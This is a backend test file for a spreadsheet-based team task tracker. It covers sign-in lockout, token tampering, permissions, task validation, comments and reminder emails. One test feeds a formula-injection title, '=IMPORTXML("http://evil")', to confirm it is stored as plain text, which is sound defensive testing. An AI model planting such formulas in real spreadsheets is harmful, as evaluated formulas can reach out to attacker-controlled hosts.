// Backend tests: run the real Code.gs against the in-memory Google mock. Run: npm run tasks:test
import assert from 'node:assert/strict';
import { beforeEach, describe, it } from 'node:test';
import { loadApp } from './gas-mock.mjs';

const srcDir = new URL('../src/', import.meta.url);
let app, adminCode, admin;

function codeFromLog() {
  const line = app.ctx.__log.find(l => l.startsWith('Admin sign-in code: '));
  return line.split(': ')[1];
}
const throwsCode = (fn, code) => assert.throws(fn, e => e.message === code || e.message.startsWith(code), `expected ${code}`);

beforeEach(() => {
  app = loadApp({ srcDir });
  app.call('setupFirstAdmin');
  adminCode = codeFromLog();
  const info = app.call('api_publicInfo');
  admin = app.call('api_login', info.members[0].id, adminCode);
});

describe('setup and schema', () => {
  it('creates every tab with its columns and default settings', () => {
    for (const name of ['Tasks', 'Members', 'Comments', 'Activity', 'Settings']) assert.ok(app.ss.getSheetByName(name), name);
    const boot = app.call('api_bootstrap', admin.token);
    assert.deepEqual(boot.statuses, ['todo', 'doing', 'review', 'done']);
    assert.ok(boot.settings.teams.length >= 5);
    assert.equal(boot.me.admin, true);
  });

  it('adds columns missing from an older sheet and keeps columns people added', () => {
    const tasks = app.ss.getSheetByName('Tasks');
    tasks.set(1, 30, 'Our notes'); // a human-added column far to the right
    app.cache.clear();
    const t = app.call('api_saveTask', admin.token, { title: 'Keep my column' });
    const row = tasks.data[1];
    tasks.set(2, 30, 'kept');
    app.call('api_saveTask', admin.token, { id: t.id, status: 'doing' });
    assert.equal(tasks.data[1][29], 'kept');
    assert.ok(row.length > 0);
  });

  it('still works when people reorder the columns in the sheet', () => {
    const t = app.call('api_saveTask', admin.token, { title: 'Reordered', priority: 'high' });
    const sh = app.ss.getSheetByName('Tasks');
    sh.data = sh.data.map(r => { const c = r.slice(); [c[1], c[4]] = [c[4], c[1]]; return c; }); // swap Title and Priority
    const again = app.call('api_bootstrap', admin.token).tasks.find(x => x.id === t.id);
    assert.equal(again.title, 'Reordered');
    assert.equal(again.priority, 'high');
  });
});

describe('sign-in', () => {
  it('rejects a wrong code and locks after five tries', () => {
    const id = admin.me.id;
    for (let i = 0; i < 5; i++) throwsCode(() => app.call('api_login', id, 'WRONG-CODE'), 'BAD_CODE');
    throwsCode(() => app.call('api_login', id, adminCode), 'LOCKED');
  });

  it('accepts codes typed in lower case or without the dash', () => {
    const plain = adminCode.replace('-', '').toLowerCase();
    assert.ok(app.call('api_login', admin.me.id, plain).token);
  });

  it('rejects missing, tampered and expired tokens', () => {
    throwsCode(() => app.call('api_bootstrap', ''), 'AUTH');
    const parts = admin.token.split('|');
    throwsCode(() => app.call('api_bootstrap', [parts[0], parts[1], parts[2], '0'.repeat(64)].join('|')), 'AUTH');
    throwsCode(() => app.call('api_bootstrap', [parts[0], '1', parts[2], parts[3]].join('|')), 'AUTH');
  });

  it('signs a member out everywhere when their code is reset', () => {
    const { member, code } = app.call('api_saveMember', admin.token, { name: 'Lina Omar', email: 'lina@example.com' });
    const lina = app.call('api_login', member.id, code);
    app.call('api_resetCode', admin.token, member.id, false);
    throwsCode(() => app.call('api_bootstrap', lina.token), 'AUTH');
  });

  it('lets a member change their own code', () => {
    const { token } = app.call('api_changeCode', admin.token, adminCode, 'my-new-code-1');
    assert.ok(app.call('api_bootstrap', token).me);
    assert.ok(app.call('api_login', admin.me.id, 'MYNEWCODE1').token);
    throwsCode(() => app.call('api_changeCode', token, 'wrong', 'whatever123'), 'BAD_CODE');
  });

  it('never stores the code itself', () => {
    const flat = JSON.stringify(app.ss.getSheetByName('Members').data);
    assert.ok(!flat.includes(adminCode) && !flat.includes(adminCode.replace('-', '')));
  });
});

describe('members (admin)', () => {
  it('creates members with a code and emails it when asked', () => {
    const r = app.call('api_saveMember', admin.token, { name: 'Omar Ali', email: 'Omar@Example.com', role: 'Events', team: 'Events', sendCode: true });
    assert.match(r.code, /^[A-Z2-9]{4}-[A-Z2-9]{4}$/);
    assert.equal(r.member.email, 'omar@example.com');
    assert.equal(app.mail.at(-1).to, 'omar@example.com');
    assert.ok(app.mail.at(-1).htmlBody.includes(r.code));
  });

  it('stops non-admins and protects the admin from removing themselves', () => {
    const { member, code } = app.call('api_saveMember', admin.token, { name: 'Sara' });
    const sara = app.call('api_login', member.id, code);
    throwsCode(() => app.call('api_saveMember', sara.token, { name: 'Hacker' }), 'FORBIDDEN');
    throwsCode(() => app.call('api_saveMember', admin.token, { id: admin.me.id, name: 'Me', admin: false }), 'BAD_INPUT:self');
    throwsCode(() => app.call('api_saveMember', admin.token, { name: 'Dup', email: 'x@y.co' }) && app.call('api_saveMember', admin.token, { name: 'Dup2', email: 'X@y.co' }), 'BAD_INPUT:email-taken');
  });

  it('hides other members\' emails from non-admins and drops deactivated members from sign-in', () => {
    const a = app.call('api_saveMember', admin.token, { name: 'Ali', email: 'ali@example.com' });
    const b = app.call('api_saveMember', admin.token, { name: 'Huda', email: 'huda@example.com' });
    const huda = app.call('api_login', b.member.id, b.code);
    const seen = app.call('api_bootstrap', huda.token).members.find(m => m.id === a.member.id);
    assert.equal(seen.email, '');
    app.call('api_saveMember', admin.token, { id: a.member.id, name: 'Ali', active: false });
    assert.ok(!app.call('api_publicInfo').members.some(m => m.id === a.member.id));
  });
});

describe('tasks', () => {
  it('creates, patches and completes a task, recording each change', () => {
    const t = app.call('api_saveTask', admin.token, { title: 'Design the IEEE Day poster', team: 'Design', due: '2026-11-20', priority: 'high' });
    assert.equal(t.id, 'T-0001');
    assert.equal(t.status, 'todo');
    const moved = app.call('api_saveTask', admin.token, { id: t.id, status: 'done' });
    assert.ok(moved.completedAt);
    assert.equal(moved.title, 'Design the IEEE Day poster'); // untouched fields stay
    const back = app.call('api_saveTask', admin.token, { id: t.id, status: 'review' });
    assert.equal(back.completedAt, '');
    const detail = app.call('api_taskDetail', admin.token, t.id);
    assert.ok(detail.activity.some(a => a.action === 'created'));
    assert.ok(detail.activity.some(a => a.details.includes('status: todo → done')));
  });

  it('validates input', () => {
    throwsCode(() => app.call('api_saveTask', admin.token, { title: '' }), 'BAD_INPUT:title');
    throwsCode(() => app.call('api_saveTask', admin.token, { title: 'x', status: 'nope' }), 'BAD_INPUT:status');
    throwsCode(() => app.call('api_saveTask', admin.token, { title: 'x', due: '20/11/2026' }), 'BAD_INPUT:due');
    throwsCode(() => app.call('api_saveTask', admin.token, { title: 'x', assignees: ['M-9999'] }), 'BAD_INPUT:assignees');
    throwsCode(() => app.call('api_saveTask', admin.token, { id: 'T-4040', title: 'x' }), 'NOT_FOUND');
  });

  it('keeps edits by two people to different fields (patches, not overwrites)', () => {
    const t = app.call('api_saveTask', admin.token, { title: 'Shared' });
    app.call('api_saveTask', admin.token, { id: t.id, due: '2026-12-01' });
    const after = app.call('api_saveTask', admin.token, { id: t.id, priority: 'urgent' });
    assert.equal(after.due, '2026-12-01');
    assert.equal(after.priority, 'urgent');
  });

  it('stores formula-like text as plain text', () => {
    const t = app.call('api_saveTask', admin.token, { title: '=IMPORTXML("http://evil")', description: '+1 call' });
    const again = app.call('api_bootstrap', admin.token).tasks.find(x => x.id === t.id);
    assert.equal(again.title, '=IMPORTXML("http://evil")');
    assert.equal(again.description, '+1 call');
  });

  it('reads a due date that someone typed into the sheet by hand', () => {
    const t = app.call('api_saveTask', admin.token, { title: 'Typed date' });
    const sh = app.ss.getSheetByName('Tasks');
    const col = sh.data[0].indexOf('Due');
    sh.data[1][col] = new Date('2026-11-25T00:00:00+03:00');
    assert.equal(app.call('api_bootstrap', admin.token).tasks.find(x => x.id === t.id).due, '2026-11-25');
  });

  it('emails new assignees (not the person assigning) and keeps names readable in the sheet', () => {
    const { member } = app.call('api_saveMember', admin.token, { name: 'Tala Samhan', email: 'tala@example.com' });
    const before = app.mail.length;
    const t = app.call('api_saveTask', admin.token, { title: 'Minutes', assignees: [member.id, admin.me.id] });
    assert.equal(app.mail.length, before + 1);
    assert.equal(app.mail.at(-1).to, 'tala@example.com');
    const sh = app.ss.getSheetByName('Tasks');
    assert.equal(sh.data[1][sh.data[0].indexOf('AssigneeNames')], 'Tala Samhan, Admin');
    app.call('api_saveTask', admin.token, { id: t.id, title: 'Minutes v2' });
    assert.equal(app.mail.length, before + 1); // no new email for unrelated edits
  });

  it('keeps checklists and labels', () => {
    const t = app.call('api_saveTask', admin.token, { title: 'Workshop', labels: ['PLC', 'lab'], checklist: [{ t: 'Book lab', d: true }, { t: 'Order kits', d: false }, { t: ' ' }] });
    assert.deepEqual(t.labels, ['PLC', 'lab']);
    assert.deepEqual(t.checklist, [{ t: 'Book lab', d: true }, { t: 'Order kits', d: false }]);
  });

  it('returns only changes since the last sync', () => {
    const a = app.call('api_saveTask', admin.token, { title: 'A' });
    const since = app.call('api_bootstrap', admin.token).serverTime;
    const until = Date.now() + 5; while (Date.now() < until) {} // make the next timestamp later
    app.call('api_saveTask', admin.token, { title: 'B' });
    const ch = app.call('api_changes', admin.token, since);
    assert.deepEqual(ch.tasks.map(t => t.title), ['B']);
    assert.ok(!ch.tasks.some(t => t.id === a.id));
  });

  it('lets only the creator or an admin archive, and only admins delete (with comments)', () => {
    const { member, code } = app.call('api_saveMember', admin.token, { name: 'Raneem' });
    const raneem = app.call('api_login', member.id, code);
    const t = app.call('api_saveTask', admin.token, { title: 'Admin task' });
    throwsCode(() => app.call('api_archiveTask', raneem.token, t.id, true), 'FORBIDDEN');
    app.call('api_addComment', raneem.token, t.id, 'On it');
    assert.equal(app.call('api_archiveTask', admin.token, t.id, true).archived, true);
    assert.ok(!app.call('api_bootstrap', admin.token).tasks.some(x => x.id === t.id));
    throwsCode(() => app.call('api_deleteTask', raneem.token, t.id), 'FORBIDDEN');
    app.call('api_deleteTask', admin.token, t.id);
    assert.equal(app.call('api_taskDetail', admin.token, t.id).comments.length, 0);
  });
});

describe('comments', () => {
  it('adds comments, counts them and notifies the others on the task', () => {
    const { member } = app.call('api_saveMember', admin.token, { name: 'Shahed', email: 'shahed@example.com' });
    const t = app.call('api_saveTask', admin.token, { title: 'Reel', assignees: [member.id] });
    const before = app.mail.length;
    const c = app.call('api_addComment', admin.token, t.id, 'Draft is in the Drive <b>folder</b>');
    assert.equal(c.author, 'Admin');
    assert.equal(app.call('api_bootstrap', admin.token).tasks.find(x => x.id === t.id).comments, 1);
    assert.equal(app.mail.length, before + 1);
    assert.ok(app.mail.at(-1).htmlBody.includes('&lt;b&gt;folder&lt;/b&gt;'));
    throwsCode(() => app.call('api_addComment', admin.token, t.id, '   '), 'BAD_INPUT:text');
  });
});

describe('settings and reminders', () => {
  it('saves teams and turns the daily reminder on and off', () => {
    const s = app.call('api_saveSettings', admin.token, { teams: ['Core', 'Media', ''], digest: true, digestHour: 9 });
    assert.deepEqual(s.teams, ['Core', 'Media']);
    assert.equal(app.triggers.length, 1);
    assert.equal(app.triggers[0].hour, 9);
    app.call('api_saveSettings', admin.token, { teams: ['Core'], digest: false, digestHour: 9 });
    assert.equal(app.triggers.length, 0);
  });

  it('emails each member only their overdue and soon-due open tasks', () => {
    const { member } = app.call('api_saveMember', admin.token, { name: 'Ahmed', email: 'ahmed@example.com' });
    app.call('api_saveTask', admin.token, { title: 'Late one', due: '2020-01-01', assignees: [member.id] });
    app.call('api_saveTask', admin.token, { title: 'Far away', due: '2099-01-01', assignees: [member.id] });
    app.call('api_saveTask', admin.token, { title: 'Done late', due: '2020-01-01', status: 'done', assignees: [member.id] });
    const before = app.mail.length;
    app.call('dailyDigest');
    const sent = app.mail.slice(before);
    assert.equal(sent.length, 1);
    assert.ok(sent[0].htmlBody.includes('Late one') && !sent[0].htmlBody.includes('Far away') && !sent[0].htmlBody.includes('Done late'));
  });
});

describe('paste-ready build', () => {
  it('dist/ matches src/ (run npm run tasks:build)', async () => {
    const { readFileSync } = await import('node:fs');
    const { build } = await import('../build.mjs');
    for (const [name, text] of Object.entries(build())) {
      assert.equal(readFileSync(new URL(`../dist/${name}`, import.meta.url), 'utf8'), text, `dist/${name} is out of date: npm run tasks:build`);
    }
  });
});

describe('sheet quirks', () => {
  it('ignores empty rows whose checkboxes read FALSE and writes new rows right under the data', () => {
    const T = app.ss.getSheetByName('Tasks'), M = app.ss.getSheetByName('Members');
    const head = sh => sh.getRange(1, 1, 1, sh.getLastColumn()).getValues()[0];
    const tcol = c => head(T).indexOf(c) + 1, mcol = c => head(M).indexOf(c) + 1;
    // What a sheet with checkbox columns looks like: every empty row holds FALSE in those columns.
    for (let r = 2; r <= 1000; r++) ['Blocked', 'Archived'].forEach(c => T.set(r, tcol(c), false));
    for (let r = M.getLastRow() + 1; r <= 1000; r++) ['Admin', 'Active', 'Notify'].forEach(c => M.set(r, mcol(c), false));
    app.ctx.resetMemo_('Tasks'); app.ctx.resetMemo_('Members');
    const boot = app.call('api_bootstrap', admin.token);
    assert.equal(boot.tasks.length, 0, 'no phantom tasks');
    assert.equal(boot.members.length, 1, 'no phantom members');
    const t = app.call('api_saveTask', admin.token, { title: 'First real task', assignees: [admin.me.id], labels: ['x'], checklist: [{ t: 'step' }] });
    assert.equal(t.id, 'T-0001');
    assert.equal(T.getRange(2, tcol('ID')).getValue(), 'T-0001', 'written on row 2, not after row 1000');
    const m = app.call('api_saveMember', admin.token, { name: 'New Member' });
    assert.equal(M.getRange(3, mcol('Name')).getValue(), 'New Member');
    assert.equal(app.call('api_bootstrap', admin.token).tasks.length, 1);
    assert.ok(m.code);
  });
});
